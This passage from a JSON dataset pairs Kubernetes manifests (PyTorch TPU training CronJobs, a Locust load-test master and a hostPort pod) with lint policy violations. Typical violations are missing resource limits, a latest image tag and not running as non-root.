configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n        - name: pytorch-datasets-claim\n          persistentVolumeClaim:\n            claimName: pytorch-datasets-claim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"monitor\" has cpu request 0"
  },
  {
    "id": "8195",
    "manifest_path": "data/manifests/the_stack_sample/sample_3039.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pt-1.6-hf-glue-bert-b-c-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: pytorch-1.6\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\ngit clone --recursive -b r1.6 https://github.com/pytorch-tpu/examples.git\\n\\\n            cd examples/deps/transformers && pip install .\\ngit log -1\\npython examples/xla_spawn.py\\\n            \\ \\\\\\n  --num_cores 8 \\\\\\n  examples/text-classification/run_glue.py \\\\\\\n            \\n  --logging_dir=./tensorboard-metrics \\\\\\n  --task_name MNLI \\\\\\n  --data_dir\\\n            \\ /datasets/glue/MNLI \\\\\\n  --cache_dir ./cache_dir \\\\\\n  --do_train \\\\\\\n            \\n  --do_eval \\\\\\n  --num_train_epochs 3 \\\\\\n  --max_seq_length 128 \\\\\\\n            \\n  --learning_rate 3e-5 \\\\\\n  --output_dir MNLI \\\\\\n  --overwrite_output_dir\\\n            \\ \\\\\\n  --logging_steps 100 \\\\\\n  --save_steps 3000 \\\\\\n  --overwrite_cache\\\n            \\ \\\\\\n  --tpu_metrics_debug \\\\\\n --model_name_or_path bert-base-cased\\\n            \\ \\\\\\n--per_gpu_train_batch_size 64 \\\\\\n--per_gpu_eval_batch_size 64\\n\\\n            gsutil -m cp -r ./tensorboard-metrics/* $(MODEL_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: XLA_USE_BF16\n            value: '0'\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/pytorch-xla:r1.6\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: '12.0'\n              memory: 80Gi\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n          - mountPath: /datasets\n            name: pytorch-datasets-claim\n            readOnly: true\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"tags_to_ignore\\\": [\\n   \\\"LearningRate\\\"\\\n              \\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false,\\n  \\\"metric_subset_to_alert\\\"\\\n              : [\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\",\\n   \\\"total_wall_time\\\"\\\n              ,\\n   \\\"Accuracy/test_final\\\",\\n   \\\"aten_ops_sum_final\\\"\\n  ],\\n  \\\"\\\n              metric_success_conditions\\\": {\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"aten_ops_sum_final\\\": {\\n    \\\"comparison\\\": \\\"less_or_equal\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 0\\n   \\\n              \\ }\\n   },\\n   \\\"eval_mnli-mm/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"eval_mnli/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"total_wall_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 5\\n   \\\n              \\ },\\n    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"\\\n              test_name\\\": \\\"pt-1.6-hf-glue-bert-b-c-conv-v3-8\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n        - name: pytorch-datasets-claim\n          persistentVolumeClaim:\n            claimName: pytorch-datasets-claim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"publisher\" has cpu request 0"
  },
  {
    "id": "8196",
    "manifest_path": "data/manifests/the_stack_sample/sample_3039.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pt-1.6-hf-glue-bert-b-c-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: pytorch-1.6\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\ngit clone --recursive -b r1.6 https://github.com/pytorch-tpu/examples.git\\n\\\n            cd examples/deps/transformers && pip install .\\ngit log -1\\npython examples/xla_spawn.py\\\n            \\ \\\\\\n  --num_cores 8 \\\\\\n  examples/text-classification/run_glue.py \\\\\\\n            \\n  --logging_dir=./tensorboard-metrics \\\\\\n  --task_name MNLI \\\\\\n  --data_dir\\\n            \\ /datasets/glue/MNLI \\\\\\n  --cache_dir ./cache_dir \\\\\\n  --do_train \\\\\\\n            \\n  --do_eval \\\\\\n  --num_train_epochs 3 \\\\\\n  --max_seq_length 128 \\\\\\\n            \\n  --learning_rate 3e-5 \\\\\\n  --output_dir MNLI \\\\\\n  --overwrite_output_dir\\\n            \\ \\\\\\n  --logging_steps 100 \\\\\\n  --save_steps 3000 \\\\\\n  --overwrite_cache\\\n            \\ \\\\\\n  --tpu_metrics_debug \\\\\\n --model_name_or_path bert-base-cased\\\n            \\ \\\\\\n--per_gpu_train_batch_size 64 \\\\\\n--per_gpu_eval_batch_size 64\\n\\\n            gsutil -m cp -r ./tensorboard-metrics/* $(MODEL_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: XLA_USE_BF16\n            value: '0'\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/pytorch-xla:r1.6\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: '12.0'\n              memory: 80Gi\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n          - mountPath: /datasets\n            name: pytorch-datasets-claim\n            readOnly: true\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"tags_to_ignore\\\": [\\n   \\\"LearningRate\\\"\\\n              \\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false,\\n  \\\"metric_subset_to_alert\\\"\\\n              : [\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\",\\n   \\\"total_wall_time\\\"\\\n              ,\\n   \\\"Accuracy/test_final\\\",\\n   \\\"aten_ops_sum_final\\\"\\n  ],\\n  \\\"\\\n              metric_success_conditions\\\": {\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"aten_ops_sum_final\\\": {\\n    \\\"comparison\\\": \\\"less_or_equal\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 0\\n   \\\n              \\ }\\n   },\\n   \\\"eval_mnli-mm/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"eval_mnli/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"total_wall_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 5\\n   \\\n              \\ },\\n    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"\\\n              test_name\\\": \\\"pt-1.6-hf-glue-bert-b-c-conv-v3-8\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n        - name: pytorch-datasets-claim\n          persistentVolumeClaim:\n            claimName: pytorch-datasets-claim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"monitor\" has memory limit 0"
  },
  {
    "id": "8197",
    "manifest_path": "data/manifests/the_stack_sample/sample_3039.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pt-1.6-hf-glue-bert-b-c-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: pytorch-1.6\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\ngit clone --recursive -b r1.6 https://github.com/pytorch-tpu/examples.git\\n\\\n            cd examples/deps/transformers && pip install .\\ngit log -1\\npython examples/xla_spawn.py\\\n            \\ \\\\\\n  --num_cores 8 \\\\\\n  examples/text-classification/run_glue.py \\\\\\\n            \\n  --logging_dir=./tensorboard-metrics \\\\\\n  --task_name MNLI \\\\\\n  --data_dir\\\n            \\ /datasets/glue/MNLI \\\\\\n  --cache_dir ./cache_dir \\\\\\n  --do_train \\\\\\\n            \\n  --do_eval \\\\\\n  --num_train_epochs 3 \\\\\\n  --max_seq_length 128 \\\\\\\n            \\n  --learning_rate 3e-5 \\\\\\n  --output_dir MNLI \\\\\\n  --overwrite_output_dir\\\n            \\ \\\\\\n  --logging_steps 100 \\\\\\n  --save_steps 3000 \\\\\\n  --overwrite_cache\\\n            \\ \\\\\\n  --tpu_metrics_debug \\\\\\n --model_name_or_path bert-base-cased\\\n            \\ \\\\\\n--per_gpu_train_batch_size 64 \\\\\\n--per_gpu_eval_batch_size 64\\n\\\n            gsutil -m cp -r ./tensorboard-metrics/* $(MODEL_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: XLA_USE_BF16\n            value: '0'\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/pytorch-xla:r1.6\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: '12.0'\n              memory: 80Gi\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n          - mountPath: /datasets\n            name: pytorch-datasets-claim\n            readOnly: true\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"tags_to_ignore\\\": [\\n   \\\"LearningRate\\\"\\\n              \\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false,\\n  \\\"metric_subset_to_alert\\\"\\\n              : [\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\",\\n   \\\"total_wall_time\\\"\\\n              ,\\n   \\\"Accuracy/test_final\\\",\\n   \\\"aten_ops_sum_final\\\"\\n  ],\\n  \\\"\\\n              metric_success_conditions\\\": {\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"aten_ops_sum_final\\\": {\\n    \\\"comparison\\\": \\\"less_or_equal\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 0\\n   \\\n              \\ }\\n   },\\n   \\\"eval_mnli-mm/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"eval_mnli/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"total_wall_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 5\\n   \\\n              \\ },\\n    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"\\\n              test_name\\\": \\\"pt-1.6-hf-glue-bert-b-c-conv-v3-8\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n        - name: pytorch-datasets-claim\n          persistentVolumeClaim:\n            claimName: pytorch-datasets-claim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"publisher\" has memory limit 0"
  },
  {
    "id": "8198",
    "manifest_path": "data/manifests/the_stack_sample/sample_3039.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pt-1.6-hf-glue-bert-b-c-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: pytorch-1.6\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\ngit clone --recursive -b r1.6 https://github.com/pytorch-tpu/examples.git\\n\\\n            cd examples/deps/transformers && pip install .\\ngit log -1\\npython examples/xla_spawn.py\\\n            \\ \\\\\\n  --num_cores 8 \\\\\\n  examples/text-classification/run_glue.py \\\\\\\n            \\n  --logging_dir=./tensorboard-metrics \\\\\\n  --task_name MNLI \\\\\\n  --data_dir\\\n            \\ /datasets/glue/MNLI \\\\\\n  --cache_dir ./cache_dir \\\\\\n  --do_train \\\\\\\n            \\n  --do_eval \\\\\\n  --num_train_epochs 3 \\\\\\n  --max_seq_length 128 \\\\\\\n            \\n  --learning_rate 3e-5 \\\\\\n  --output_dir MNLI \\\\\\n  --overwrite_output_dir\\\n            \\ \\\\\\n  --logging_steps 100 \\\\\\n  --save_steps 3000 \\\\\\n  --overwrite_cache\\\n            \\ \\\\\\n  --tpu_metrics_debug \\\\\\n --model_name_or_path bert-base-cased\\\n            \\ \\\\\\n--per_gpu_train_batch_size 64 \\\\\\n--per_gpu_eval_batch_size 64\\n\\\n            gsutil -m cp -r ./tensorboard-metrics/* $(MODEL_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: XLA_USE_BF16\n            value: '0'\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/pytorch-xla:r1.6\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: '12.0'\n              memory: 80Gi\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n          - mountPath: /datasets\n            name: pytorch-datasets-claim\n            readOnly: true\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"tags_to_ignore\\\": [\\n   \\\"LearningRate\\\"\\\n              \\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false,\\n  \\\"metric_subset_to_alert\\\"\\\n              : [\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\",\\n   \\\"total_wall_time\\\"\\\n              ,\\n   \\\"Accuracy/test_final\\\",\\n   \\\"aten_ops_sum_final\\\"\\n  ],\\n  \\\"\\\n              metric_success_conditions\\\": {\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"aten_ops_sum_final\\\": {\\n    \\\"comparison\\\": \\\"less_or_equal\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 0\\n   \\\n              \\ }\\n   },\\n   \\\"eval_mnli-mm/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"eval_mnli/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"total_wall_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 5\\n   \\\n              \\ },\\n    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"\\\n              test_name\\\": \\\"pt-1.6-hf-glue-bert-b-c-conv-v3-8\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n        - name: pytorch-datasets-claim\n          persistentVolumeClaim:\n            claimName: pytorch-datasets-claim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"train\" has memory limit 0"
  },
  {
    "id": "8199",
    "manifest_path": "data/manifests/the_stack_sample/sample_3040.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: locust-master\n  labels:\n    name: locust\n    role: master\nspec:\n  replicas: 1\n  selector:\n    name: locust\n    role: master\n  template:\n    metadata:\n      labels:\n        name: locust\n        role: master\n    spec:\n      containers:\n      - name: locust\n        image: gcr.io/cloud-solutions-images/locust-tasks:latest\n        env:\n        - name: LOCUST_MODE\n          value: master\n        - name: TARGET_HOST\n          value: http://qa20.ciodive.com:8080\n        ports:\n        - name: loc-master-web\n          containerPort: 8089\n          protocol: TCP\n        - name: loc-master-p1\n          containerPort: 5557\n          protocol: TCP\n        - name: loc-master-p2\n          containerPort: 5558\n          protocol: TCP\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"locust\" is using an invalid container image, \"gcr.io/cloud-solutions-images/locust-tasks:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8200",
    "manifest_path": "data/manifests/the_stack_sample/sample_3040.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: locust-master\n  labels:\n    name: locust\n    role: master\nspec:\n  replicas: 1\n  selector:\n    name: locust\n    role: master\n  template:\n    metadata:\n      labels:\n        name: locust\n        role: master\n    spec:\n      containers:\n      - name: locust\n        image: gcr.io/cloud-solutions-images/locust-tasks:latest\n        env:\n        - name: LOCUST_MODE\n          value: master\n        - name: TARGET_HOST\n          value: http://qa20.ciodive.com:8080\n        ports:\n        - name: loc-master-web\n          containerPort: 8089\n          protocol: TCP\n        - name: loc-master-p1\n          containerPort: 5557\n          protocol: TCP\n        - name: loc-master-p2\n          containerPort: 5558\n          protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"locust\" does not have a read-only root file system"
  },
  {
    "id": "8201",
    "manifest_path": "data/manifests/the_stack_sample/sample_3040.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: locust-master\n  labels:\n    name: locust\n    role: master\nspec:\n  replicas: 1\n  selector:\n    name: locust\n    role: master\n  template:\n    metadata:\n      labels:\n        name: locust\n        role: master\n    spec:\n      containers:\n      - name: locust\n        image: gcr.io/cloud-solutions-images/locust-tasks:latest\n        env:\n        - name: LOCUST_MODE\n          value: master\n        - name: TARGET_HOST\n          value: http://qa20.ciodive.com:8080\n        ports:\n        - name: loc-master-web\n          containerPort: 8089\n          protocol: TCP\n        - name: loc-master-p1\n          containerPort: 5557\n          protocol: TCP\n        - name: loc-master-p2\n          containerPort: 5558\n          protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"locust\" is not set to runAsNonRoot"
  },
  {
    "id": "8202",
    "manifest_path": "data/manifests/the_stack_sample/sample_3040.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: locust-master\n  labels:\n    name: locust\n    role: master\nspec:\n  replicas: 1\n  selector:\n    name: locust\n    role: master\n  template:\n    metadata:\n      labels:\n        name: locust\n        role: master\n    spec:\n      containers:\n      - name: locust\n        image: gcr.io/cloud-solutions-images/locust-tasks:latest\n        env:\n        - name: LOCUST_MODE\n          value: master\n        - name: TARGET_HOST\n          value: http://qa20.ciodive.com:8080\n        ports:\n        - name: loc-master-web\n          containerPort: 8089\n          protocol: TCP\n        - name: loc-master-p1\n          containerPort: 5557\n          protocol: TCP\n        - name: loc-master-p2\n          containerPort: 5558\n          protocol: TCP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"locust\" has cpu request 0"
  },
  {
    "id": "8203",
    "manifest_path": "data/manifests/the_stack_sample/sample_3040.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: locust-master\n  labels:\n    name: locust\n    role: master\nspec:\n  replicas: 1\n  selector:\n    name: locust\n    role: master\n  template:\n    metadata:\n      labels:\n        name: locust\n        role: master\n    spec:\n      containers:\n      - name: locust\n        image: gcr.io/cloud-solutions-images/locust-tasks:latest\n        env:\n        - name: LOCUST_MODE\n          value: master\n        - name: TARGET_HOST\n          value: http://qa20.ciodive.com:8080\n        ports:\n        - name: loc-master-web\n          containerPort: 8089\n          protocol: TCP\n        - name: loc-master-p1\n          containerPort: 5557\n          protocol: TCP\n        - name: loc-master-p2\n          containerPort: 5558\n          protocol: TCP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"locust\" has memory limit 0"
  },
  {
    "id": "8204",
    "manifest_path": "data/manifests/the_stack_sample/sample_3041.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostports1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    ports:\n    - containerPort: 12346\n      hostPort: 12346\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "latest-tag",
